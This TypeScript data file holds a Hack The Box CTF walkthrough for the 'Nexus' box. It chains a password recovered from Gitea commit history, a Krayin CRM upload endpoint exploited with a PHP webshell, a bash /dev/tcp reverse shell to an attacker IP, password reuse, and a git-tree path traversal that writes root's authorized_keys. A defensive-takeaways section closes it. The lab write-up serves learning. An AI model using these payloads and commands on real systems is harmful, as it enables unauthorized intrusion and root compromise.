import type { WalkthroughDoc } from "./types";

export const nexus: WalkthroughDoc = {
  slug: "nexus",
  name: "Nexus",
  platform: "Hack The Box",
  os: "Linux",
  difficulty: "Easy",
  retired: "Jul 2026",
  ip: "10.10.11.x",
  tags: [
    "Gitea history",
    "Krayin CRM",
    "CVE-2026-38526",
    "TinyMCE upload",
    "password reuse",
    "systemd timer",
    "path traversal",
    "authorized_keys",
  ],
  lede: "A public Gitea repo hides a rotated-but-not-purged CRM password in its commit history; that lands a Krayin CRM admin session where an unrestricted TinyMCE upload gives `www-data`; a Laravel `.env` reveals a reused SSH password for user; and a root-owned `gitea-template-sync` timer that materialises git-tree entries without path containment gets coerced into dropping our public key straight into `/root/.ssh/authorized_keys`.",
  summary: "Gitea history leak → Krayin CRM CVE-2026-38526 TinyMCE upload RCE → `.env` password reuse → a root-owned Gitea template sync writes `authorized_keys` via a path-traversal tree entry.",
  sections: [
    {
      id: "overview",
      num: "00",
      title: "Overview",
      blocks: [
        { kind: "epigraph", text: "“Rotating a secret you committed is not the same as removing it.”" },
        { kind: "p", text: "**Nexus** is an Easy-rated Linux box that sits behind a gov-style “energy authority” landing page. The whole chain is a study in trust boundaries a real environment gets wrong: source-control history that outlives the secrets it once held, an admin CRM shipped with a file-upload endpoint that never learned to say no, a `.env` that assumes nobody who reaches `www-data` will read it, and a root systemd timer that writes to disk whatever a low-privileged Gitea user tells it to." },
        { kind: "p", text: "Nothing here needs a shellcoder — it wants the discipline to read commit graphs, an API call at each hinge point, and a little `git` plumbing at the end. The route from external scan to root shell is:" },
        { kind: "h4", text: "Attack chain" },
        {
          kind: "ol",
          items: [
            "**recon** — nmap → SSH, nginx",
            "**vhost fuzz** — `git.nexus.htb`, `billing.nexus.htb`",
            "**Gitea history** — `git log -p` recovers `j.matthew` CRM password",
            "**Krayin CRM 2.2.0** — admin login",
            "**CVE-2026-38526** — `POST /admin/tinymce/upload` → `www-data` RCE",
            "**Krayin `.env`** — leaks `jones` password (reused for SSH)",
            "**ssh jones** — `user.txt`",
            "**enumerate** — `gitea-template-sync.timer` runs as root",
            "**craft tree** — git plumbing with a `../` path entry",
            "**push to template repo** — timer materialises `/root/.ssh/authorized_keys`",
            "**ssh -i root** — `root.txt`",
          ],
        },
        { kind: "callout", variant: "note", title: "Reading the box", text: "Every stage on Nexus is a leak feeding the next hop. The Gitea leak gives you a CRM password; the CRM leaks a shell; the shell leaks an SSH password; the SSH user reaches a Gitea API token that lets a root timer write to your home. Follow the data, not the exploits." },
      ],
    },
    {
      id: "recon",
      num: "01",
      title: "Enumeration",
      blocks: [
        { kind: "h3", text: "Port scan" },
        { kind: "p", text: "A full TCP sweep at a decent rate, then a service scan on the survivors — nothing surprising, and that is itself a signal. When only 22 and 80 answer, the web stack is going to do the heavy lifting." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ nmap -p- --min-rate 10000 -sV -sC -oA nmap/nexus 10.10.11.x",
            "PORT   STATE SERVICE VERSION",
            "22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)",
            "80/tcp open  http    nginx 1.24.0 (Ubuntu)",
            "|_http-title: Did not follow redirect to http://nexus.htb/",
          ],
        },
        { kind: "p", text: "The HTTP 302 to `nexus.htb` is our cue to add the vhost to `/etc/hosts` before we go any further. Skip that and everything downstream — cookies, CSRF tokens, redirects — quietly misbehaves." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ echo \"10.10.11.x  nexus.htb\" | sudo tee -a /etc/hosts",
          ],
        },
        { kind: "p", text: "`http://nexus.htb/` renders a static energy-regulator brochure — no obvious app, no login, no directory listing. There is nothing to exploit here, so we pivot to vhost fuzzing." },
      ],
    },
    {
      id: "vhosts",
      num: "02",
      title: "Virtual-host discovery",
      blocks: [
        { kind: "p", text: "nginx is happy to serve as many vhosts as its config declares. Iterate the `Host:` header against a subdomain wordlist and filter out the size of the default landing page — the survivors are the interesting apps." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ ffuf -u http://10.10.11.x -H \"Host: FUZZ.nexus.htb\" \\",
            "      -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac",
            "--------------------------------",
            "git                     [Status: 200, Size: 12403]",
            "billing                 [Status: 302, Size: 358]",
          ],
          highlight: [3, 4],
        },
        { kind: "callout", variant: "tip", title: "`-ac` earns its keep here", text: "Auto-calibration teaches ffuf what a “not found” response looks like on this host and filters it out automatically. Without it, wildcard vhost handling on nginx would drown the two real hits in the default page’s size. `-fs 178` (the exact bytes of the default 404) is a fine manual fallback." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ echo \"10.10.11.x  git.nexus.htb billing.nexus.htb\" | sudo tee -a /etc/hosts",
          ],
        },
        { kind: "p", text: "`git.nexus.htb` is a **Gitea** instance — self-hosted git with a familiar Gogs-descended UI. `billing.nexus.htb` redirects to `/admin/login`: a **Krayin CRM** (Laravel) panel. Two mouths to feed; the safe order is to read code first and log in second." },
      ],
    },
    {
      id: "gitea",
      num: "03",
      title: "Gitea — a secret buried in history",
      blocks: [
        { kind: "epigraph", text: "“HEAD is clean. The graph is not.”" },
        { kind: "p", text: "Gitea exposes public repos to anonymous visitors, and this instance has one that looks provisioning-flavoured: `admin/krayin-docker-setup`. The name alone tells you what it is — the compose files and env stubs the operators used to bring the CRM up." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ git clone http://git.nexus.htb/admin/krayin-docker-setup.git",
            "$ cd krayin-docker-setup",
            "$ git log --all --oneline",
            "3f9c1e2 (HEAD -> main, origin/main) cleanup: strip test creds",
            "b41a7d0 fix: pin krayin 2.2.0",
            "8ac2e51 initial docker-compose for krayin",
          ],
        },
        { kind: "p", text: "That top commit is the tell — a *cleanup* aimed at credentials. On any modern platform, that only redacts `HEAD`. The blobs it deleted are still in the object database, reachable through the reflog, `git log -p`, or a pickaxe search on any secret-shaped variable name." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ git log -p --all -- .env",
            "$ # or, aimed at what we're actually looking for:",
            "$ git log -p --all -S 'DB_PASSWORD'",
            "...",
            "-DB_USERNAME=j.matthew@nexus.htb",
            "-DB_PASSWORD=N27xh!!2ucY04",
            "+DB_USERNAME=changeme",
            "+DB_PASSWORD=changeme",
          ],
          highlight: [4, 5],
        },
        { kind: "callout", variant: "key", title: "Recovered", text: "Krayin CRM admin: `j.matthew@nexus.htb` / `N27xh!!2ucY04`. Note the shape — the username is a real email address, and the password mixes case, punctuation and digits without being a passphrase; it is human-chosen, so we expect it to be reused later." },
      ],
    },
    {
      id: "krayin-login",
      num: "04",
      title: "Krayin CRM — inventory the admin panel",
      blocks: [
        { kind: "p", text: "Point the browser at `http://billing.nexus.htb/admin/login`, drop the credentials in, and we land in a **Krayin CRM v2.2.0** dashboard. The footer, the `/vendor/` asset paths, and the login form’s Laravel CSRF token all agree on the framework. Version pinning matters here — 2.2.0 is inside the window of a live public CVE." },
        {
          kind: "ul",
          items: [
            "the CRM is Laravel-backed, so uploads land under `storage/` and are served straight by nginx;",
            "the admin UI ships **TinyMCE** for rich-text fields — image, quote, contact notes — with a paired upload endpoint;",
            "there is a settings panel that lets you flip file-storage locations, but we do not need it.",
          ],
        },
        { kind: "callout", variant: "note", title: "Why we look at TinyMCE first", text: "Rich-text editors are one of the classic upload-vuln surfaces — they need a place for pasted images to go, so they expose a broad multipart endpoint, and the file goes straight to disk. In 2026 that endpoint on Krayin ≤ 2.2.x turned out to be an unrestricted-upload sink." },
      ],
    },
    {
      id: "rce",
      num: "05",
      title: "CVE-2026-38526 — TinyMCE upload → `www-data` RCE",
      blocks: [
        { kind: "p", text: "**CVE-2026-38526** (CVSS 9.9) is Krayin CRM ≤ 2.2.x accepting any file at `POST /admin/tinymce/upload`. There is no MIME sniff, no extension allowlist, and the destination `storage/tinymce/<hash>/` sits inside nginx’s docroot with PHP execution on. Drop a `.php` file, receive its public URL, request the URL — the interpreter runs it." },
        { kind: "p", text: "The request chain in a browser session is:" },
        {
          kind: "code",
          lang: "http",
          label: "request outline",
          lines: [
            "GET  /admin/login              # scrape CSRF token from the HTML form",
            "POST /admin/login              # authenticate, keep Laravel session + XSRF-TOKEN cookies",
            "GET  /admin/dashboard          # refresh XSRF-TOKEN for the API call",
            "POST /admin/tinymce/upload",
            "     Content-Type: multipart/form-data",
            "     X-XSRF-TOKEN: <token>",
            "     X-Requested-With: XMLHttpRequest",
            "     file=shell.png.php  (Content-Type: image/jpeg)",
            "     payload: <?php system($_GET['cmd']); ?>",
            "# response: {\"location\":\"http://billing.nexus.htb/storage/tinymce/<hash>/shell.png.php\"}",
            "GET  <location>?cmd=id         # arbitrary command as www-data",
          ],
        },
        { kind: "callout", variant: "tip", title: "Two payload shapes, both survive", text: "The endpoint is happy with a plain `.php` file whose `Content-Type` header lies (`image/jpeg`), or a double extension like `shell.png.php`. The double-extension variant is slightly more polite to log-scrapers looking for `.php` uploads and is the one most public PoCs use." },
        { kind: "p", text: "Once `?cmd=id` returns `uid=33(www-data)`, upgrade to an interactive reverse shell with a base64-encoded bash one-liner in the query string — Laravel’s docroot has no egress restrictions, so any listener on our tun0 will do." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ nc -lvnp 9001",
            "$ # in another terminal — url-encode ampersands, base64 the bash bit:",
            "$ CMD='bash -c \"bash -i >& /dev/tcp/10.10.14.x/9001 0>&1\"'",
            "$ B64=$(printf %s \"$CMD\" | base64 -w0)",
            "$ curl -G \"http://billing.nexus.htb/storage/tinymce/<hash>/shell.png.php\" \\",
            "      --data-urlencode \"cmd=echo $B64 | base64 -d | bash\"",
          ],
        },
        { kind: "p", text: "The listener returns a shell. Stabilise as ever — `script -qc bash /dev/null`, `stty raw -echo; fg`, resize with `stty rows … cols …` — and we have a foothold as `www-data` inside the Laravel container’s writable tree." },
      ],
    },
    {
      id: "user",
      num: "06",
      title: "`.env` → password reuse → `user.txt`",
      blocks: [
        { kind: "p", text: "Laravel keeps runtime configuration in a `.env` at the application root. That file is where DB credentials, SMTP passwords, third-party API keys, and — depressingly often — real user passwords end up, because a developer wanted to seed the app quickly and never rotated the choice." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "www-data$ cat /var/www/html/.env",
            "APP_NAME=Krayin",
            "APP_ENV=production",
            "APP_KEY=base64:...",
            "APP_URL=http://billing.nexus.htb",
            "",
            "DB_CONNECTION=mysql",
            "DB_HOST=db",
            "DB_DATABASE=krayin",
            "DB_USERNAME=jones",
            "DB_PASSWORD=y27xb3ha!!74GbR",
          ],
          highlight: [9, 10],
        },
        { kind: "p", text: "The DB user is not the CRM admin from the Gitea leak — it is a system account called `jones`. A glance at `/etc/passwd` confirms that `jones` has a real login shell on the host, and the shape of the password (same operator, same punctuation habit) makes it a strong reuse candidate." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "www-data$ grep bash /etc/passwd",
            "root:x:0:0:root:/root:/bin/bash",
            "jones:x:1000:1000::/home/jones:/bin/bash",
            "",
            "$ ssh jones@nexus.htb",
            "jones@nexus:~$ cat user.txt",
            "76a8fc64····························",
          ],
          highlight: [6],
        },
        { kind: "callout", variant: "key", title: "Recovered", text: "`jones` : `y27xb3ha!!74GbR` — reused between the Laravel DB user and the host SSH account. This pattern (one operator, one password vocabulary, applied across every account they touch) is what makes `.env` files high-value loot even when the DB it names is unreachable." },
      ],
    },
    {
      id: "enum-root",
      num: "07",
      title: "Enumerating for root — a timer with too much reach",
      blocks: [
        { kind: "p", text: "As `jones` there is no obvious sudo rule, no SUID surprise, and no writable service unit. The interesting anomaly is a **timer** running under a systemd unit named for the git service." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "jones@nexus:~$ systemctl list-timers --all | grep -i gitea",
            "Sat 2026-... UTC   3min left   gitea-template-sync.timer   gitea-template-sync.service",
            "",
            "jones@nexus:~$ systemctl cat gitea-template-sync.service",
            "[Service]",
            "Type=oneshot",
            "User=root",
            "ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py",
          ],
          highlight: [1, 6, 7],
        },
        { kind: "p", text: "So a Python script runs as **root** on a schedule. Reading the script itself is not required to see the shape — but glancing at `/etc/gitea/template-sync.py` shows the intent clearly: it uses the Gitea API to list repositories marked as templates, checks them out into a staging directory, and for each entry returned by `git ls-tree -r <ref>` it opens a destination path by joining the staging root with the tree entry’s path, then writes the blob’s bytes there." },
        { kind: "callout", variant: "warn", title: "The bug is what is *not* there", text: "The script never runs `os.path.realpath()` on the destination and never checks that the resolved path is still under the staging root. A tree entry’s path is untrusted, mutable data — `../../../root/.ssh/authorized_keys` is a valid string, git will happily store it, and Python’s `open()` will follow it out of the staging directory when the process has the permissions to do so." },
        { kind: "p", text: "The exploit shape falls straight out of that: publish a Gitea repository, get it marked as a template, and push a commit whose tree contains an entry whose *path* is a traversal string pointing at a file root can write. The script does the rest, from a root-owned service, at a schedule we can see." },
      ],
    },
    {
      id: "gitea-api",
      num: "08",
      title: "Getting a Gitea token and a template repo",
      blocks: [
        { kind: "p", text: "Gitea’s REST API is authenticated with a per-user token that we can mint over HTTP as `jones` — the CRM credential is unrelated, but jones exists in Gitea because the same operators run both services and reuse identities between them." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ curl -s -u 'jones:y27xb3ha!!74GbR' \\",
            "      -H 'Content-Type: application/json' \\",
            "      -X POST http://git.nexus.htb/api/v1/users/jones/tokens \\",
            "      -d '{\"name\":\"pwn\",\"scopes\":[\"write:repository\"]}'",
            "{\"id\":..., \"name\":\"pwn\", \"sha1\":\"<TOKEN>\", ...}",
          ],
          highlight: [4],
        },
        { kind: "p", text: "With the token we create a repo and, crucially, flip the *template* flag — the sync script only walks repos it considers templates." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ TOKEN=<TOKEN>",
            "$ curl -s -H \"Authorization: token $TOKEN\" -H 'Content-Type: application/json' \\",
            "      -X POST http://git.nexus.htb/api/v1/user/repos \\",
            "      -d '{\"name\":\"pwn\",\"auto_init\":true,\"private\":false}'",
            "",
            "$ curl -s -H \"Authorization: token $TOKEN\" -H 'Content-Type: application/json' \\",
            "      -X PATCH http://git.nexus.htb/api/v1/repos/jones/pwn \\",
            "      -d '{\"template\":true}'",
          ],
        },
        { kind: "callout", variant: "tip", title: "The template flag matters", text: "Gitea’s `/api/v1/repos/{owner}/{repo}` PATCH accepts `template: true` and the setting shows up in the web UI as “Template”. Without it, the sync loop’s `is_template` filter simply skips the repo and the whole exploit sits idle." },
      ],
    },
    {
      id: "plumbing",
      num: "09",
      title: "Crafting the malicious tree with git plumbing",
      blocks: [
        { kind: "epigraph", text: "“Porcelain won’t let you commit `../../../root/.ssh/authorized_keys`. Plumbing will.”" },
        { kind: "p", text: "`git add` refuses to stage a path that escapes the working tree — that safety check lives in the porcelain, not the object model. The **plumbing** commands (`hash-object`, `mktree`, `commit-tree`, `update-ref`) bypass the check and let us assemble a commit whose tree entry has any bytes we want as its name." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ ssh-keygen -t ed25519 -f nexus_root_key -N ''",
            "",
            "$ git clone http://git.nexus.htb/jones/pwn.git && cd pwn",
            "",
            "$ # 1. write our authorized_keys line into the object DB as a blob",
            "$ AUTH_KEY_CONTENT=$(cat ../nexus_root_key.pub)",
            "$ BLOB=$(echo \"$AUTH_KEY_CONTENT\" | git hash-object -w --stdin)",
            "",
            "$ # 2. build a tree with a single entry whose PATH escapes the checkout dir",
            "$ TREE=$(printf '100644 blob %s\\t../../../../../root/.ssh/authorized_keys\\n' \"$BLOB\" | git mktree)",
            "",
            "$ # 3. wrap the tree in a commit",
            "$ COMMIT=$(git commit-tree $TREE -m 'pwn')",
            "",
            "$ # 4. point main at it and push",
            "$ git update-ref refs/heads/main $COMMIT",
            "$ git push -f origin main",
          ],
          highlight: [8, 9, 14],
        },
        { kind: "p", text: "The tree entry’s *mode* is `100644` (a regular file), its *object* is the blob hash we just wrote, and its *path* is a traversal string with enough `../` hops to climb from the sync script’s staging directory out to `/root/.ssh/`. The exact hop count depends on where the script clones its templates — five is a safe overshoot that trailing-`..`-tolerant `open()` calls do not mind." },
        { kind: "callout", variant: "warn", title: "One entry per push", text: "`git mktree` reads *entries* on stdin; each line is `mode SP type SP hash TAB path`. Keep exactly one line for a single-file blast radius. Two entries with the same traversal path silently collide and only one lands on disk — pick the target file, publish one blob." },
        { kind: "p", text: "With the malicious commit at the tip of `main`, the next fire of `gitea-template-sync.timer` will pull the ref, iterate `git ls-tree -r`, and write our blob to the path it names — as **root**." },
      ],
    },
    {
      id: "root",
      num: "10",
      title: "`root.txt`",
      blocks: [
        { kind: "p", text: "Watch the timer for the next scheduled fire and — the moment it flips from *waiting* to a completed run — try our key against SSH." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "jones@nexus:~$ systemctl list-timers gitea-template-sync.timer",
            "NEXT                        LEFT   LAST                    PASSED   UNIT",
            "Sat 2026-... UTC            0s ago Sat 2026-... UTC        30s ago  gitea-template-sync.timer",
            "",
            "$ chmod 600 nexus_root_key",
            "$ ssh -i nexus_root_key root@nexus.htb",
            "root@nexus:~# id",
            "uid=0(root) gid=0(root) groups=0(root)",
            "root@nexus:~# cat /root/root.txt",
            "286204e3····························",
          ],
          highlight: [7, 9],
        },
        { kind: "p", text: "The white-list mechanism was upstream of us the whole time: the sync script trusted every byte inside a git tree entry as a filename it could open. We supplied the bytes; root wrote the file." },
      ],
    },
    {
      id: "defense",
      num: "11",
      title: "Defensive takeaways",
      blocks: [
        {
          kind: "ul",
          items: [
            "**Git history is public.** Rotating a secret after committing it is not enough — the secret survives in `git log -p` forever. Rewrite with `git filter-repo`/BFG *and* rotate immediately after any accidental commit, and enforce a secret-scanner as a pre-commit and pre-receive hook.",
            "**Server-side upload validation is not optional.** Krayin’s TinyMCE endpoint accepted any bytes at any extension. Enforce a *server-side* extension allowlist, verify magic bytes, store uploads outside any interpreted docroot, and serve them through a handler that sets `Content-Disposition`.",
            "**Segregate `.env` from anything a webshell can reach.** Rotate DB/user secrets independently, and read them from Docker/Vault secrets rather than a file on disk that inherits the webserver’s uid.",
            "**Path-sanitise every git-tree materialisation.** Any script that walks `git ls-tree` and writes to disk MUST `realpath()` each destination and refuse anything that does not resolve under the staging root. Git tree entries carry attacker-controlled bytes; treat them like an HTTP upload filename.",
            "**Root-owned timers that ingest user-controllable input are tier-0.** Audit unit files for read paths that a lower-privileged user can influence (Gitea API, `/var/lib/gitea/repos`, uploaded artefacts). Run such jobs as a dedicated low-priv user with append-only rights to a staging dir; never as `root`.",
            "**Detect the tail.** Alarm on writes to `~/.ssh/authorized_keys` outside the owning user’s login session, root SSH logins from a key not present at build time, and unusual `git ls-tree` invocations by long-running root services.",
          ],
        },
        { kind: "callout", variant: "note", title: "Skills exercised", text: "vhost enumeration · git history archaeology · Laravel/CRM version fingerprinting · unrestricted file-upload RCE (CVE-2026-38526) · Laravel `.env` post-exploitation · password-reuse pivoting · systemd timer auditing · Gitea API abuse · git plumbing for path-traversal payloads · authorized_keys drop to root SSH." },
      ],
    },
  ],
};
